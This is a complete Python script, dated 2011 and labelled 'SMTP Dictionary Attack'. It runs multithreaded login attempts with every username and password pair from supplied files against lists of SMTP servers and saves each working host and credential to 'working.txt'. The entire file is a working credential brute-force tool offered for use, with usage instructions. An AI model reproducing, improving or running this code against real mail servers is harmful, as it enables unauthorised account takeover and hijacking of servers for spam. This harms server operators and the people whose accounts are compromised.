#! /usr/bin/env python3.2
# SMTP Dictionary Attack
# 21.03.2011 cmiN

from smtplib import SMTP
from sys import argv
import threading

def usage():
    print("\tUsage: source.ext <hosts> <users> <words> <threads> [timeout]")
    print("Note that hosts, users and words are text files with <EOL> separated strings.")
    print("Threads is an integer.")
    print("Timeout is a float in seconds and is optional.")
    print("Example: smda.py hosts.txt C:\\users.txt /tmp/words.txt 10 1")

def fill_vec(name, vec):
    count = 0
    with open(name, "rt") as fin:
        for x in fin:
            y = x.strip()
            if not y in vec:
                vec.add(y)
                count += 1
    return count

class SDA(threading.Thread):
    hvec = None
    timeout = None
    count = 0
    fobj = None
    def __init__(self, user, word):
        threading.Thread.__init__(self)
        self.user = user
        self.word = word
    def run(self):
        for host in list(SDA.hvec):
            try:
                server = SMTP(host, timeout=SDA.timeout)
                server.login(self.user, self.word)
                server.quit()
                if host in SDA.hvec:
                    SDA.hvec.remove(host)
                    string = "%s %s %s\n" % (host, self.user, self.word)
                    SDA.fobj.write(string)
                    SDA.fobj.flush()
                    SDA.count += 1
            except:
                pass

def process(hosts, users, words, threads, timeout=None):
    hvec, uvec, wvec = set(), set(), set()
    comp = fill_vec(hosts, hvec) * ((fill_vec(users, uvec) * fill_vec(words, wvec)) / threads)
    print("Processing %d requests per thread. Please wait..." % comp)
    SDA.hvec = hvec
    SDA.timeout = timeout
    SDA.fobj = open("working.txt", "at")
    for user in uvec:
        for word in wvec:
            while threading.active_count() > threads:
                pass
            SDA(user, word).start()
    while threading.active_count() > 1:
        pass
    SDA.fobj.write("=" * 50 + "\n")
    SDA.fobj.close()
    print("Finished! Were found %d working SMTPs (see 'working.txt')." % SDA.count)

def main():
    if len(argv) == 6:
        process(argv[1], argv[2], argv[3], int(argv[4]), float(argv[5]))
    elif len(argv) == 5:
        process(argv[1], argv[2], argv[3], int(argv[4]))
    else:
        usage()

if __name__ == "__main__":
    main()
